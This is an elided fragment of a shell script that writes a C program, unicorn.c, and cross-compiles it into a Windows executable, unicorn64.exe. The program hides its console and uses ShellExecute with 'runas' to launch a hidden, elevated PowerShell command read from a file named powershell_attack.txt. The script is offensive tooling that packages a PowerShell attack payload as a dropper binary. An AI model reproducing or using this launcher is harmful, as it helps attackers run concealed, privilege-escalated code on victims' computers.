...
echo -n 'ShellExecute( NULL,NULL, "powershell -w 1 -C","' >> unicorn.c
...
x86_64-w64-mingw32-gcc -m64 unicorn.c -o unicorn64.exe > /dev/null 2>&1
if [ -x ./unicorn64.exe ]; then
echo '[*] unicorn64.exe compiled'
ls -la unicorn64.exe
else
...
echo '{' >> unicorn.c
echo 'FreeConsole();' >> unicorn.c
echo -n ' ShellExecute( NULL, "runas", "powershell -w 1 -C","' >> unicorn.c
cat powershell_attack.txt | sed -r 's/^.{20}//' >> unicorn.c
echo -n ',NULL,NULL);' >> unicorn.c
echo '' >> unicorn.c
echo 'exit(0);' >> unicorn.c
